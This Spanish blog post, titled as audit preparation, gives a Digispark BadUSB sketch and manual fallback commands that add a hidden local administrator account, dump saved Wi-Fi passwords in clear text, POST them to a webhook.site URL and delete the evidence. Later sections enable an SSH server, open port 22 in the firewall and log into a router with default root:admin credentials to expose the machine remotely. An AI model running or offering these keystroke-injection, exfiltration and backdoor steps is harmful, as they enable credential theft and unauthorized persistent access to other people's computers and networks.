---
layout: post
title: Todo lo que necesitamos para la auditoria
subtitle: Este articulo se eliminara el miercoles
cover-img: /assets/img/auditoria/icono.png
thumbnail-img: /assets/img/auditoria/icono.png
tags: [auditoria]
excerpt: "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
---

Hecho por boyras200

<br>
<br>

## Programa del digispark

```
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("simbolo");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0x4F);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(0x51);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.println("net user Usuario-Auditoria D2z14IdWykPO /add");
  DigiKeyboard.println("net localgroup Administradores Usuario-Auditoria /add");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cd %temp%"); //going to temporary dir
  DigiKeyboard.delay(250);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(250);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(250);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/d5dbbd9c-cf83-4df7-adfb-10894b22d13a -Method POST -InFile PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(250);
  DigiKeyboard.println("del Wi-* /s /f /q 6 del PASS"); //cleaning up all the mess
  DigiKeyboard.println("exit");

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
```

## Comandos por si no va el digispark

```
Windows. Simbolo del sistema, con permisos de administrador.
net user Usuario-Auditoria D2z14IdWykPO /add
net localgroup Administradores Usuario-Auditoria /add
cd %temp%
netsh wlan export profile key=clear");
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > PASS
powershell Invoke-WebRequest -Uri https://webhook.site/d5dbbd9c-cf83-4df7-adfb-10894b22d13a -Method POST -InFile PASS
del Wi-* /s /f /q 6 del PASS
exit
```


Cuando en el script nos aparezca esto, le daremos a SI:

![](/assets/img/auditoria/cmd.png.jpg)


Despues clickaremos en el cmd:

![](/assets/img/auditoria/cmd2.jpg)


## Sacar IP

Vamos a sacar la IP privada del sistema. Para esto simplemete hacemos los siguiente:

`Windows + R` 

`cmd`

`ipconfig`

Nos deberia aparecer algo como esto:

/assets/img/auditoria/ipconfig.png


/assets/img/auditoria/ipconfig2.png


Ya tenemos la IP privada, la necesitaremos mas tarde.


## Habilitar ssh

Empezamos abriendo powershell como administrador:

/assets/img/auditoria/powershell.png


Ahora ejecutaremos los siguientes comandos:


`Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'`

`Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0`

`Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0`

`Start-Service sshd`

`Set-Service -Name sshd -StartupType 'Automatic'`

`if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
} else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}`


Ya hemos habilitado ssh.


##Router

Primero entramos en `https://www.cual-es-mi-ip.net/`

/assets/img/auditoria/ip.png

Ahora vamos a `http://192.168.100.1/`

Ponemos las credenciales root:admin

Deberiamos haber encontrado algo como esto:

![](/assets/img/auditoria/router.png)

Ahora ponemos esto:

![](/assets/img/auditoria/router2.png)



# Ya debería estar funcionando todo.
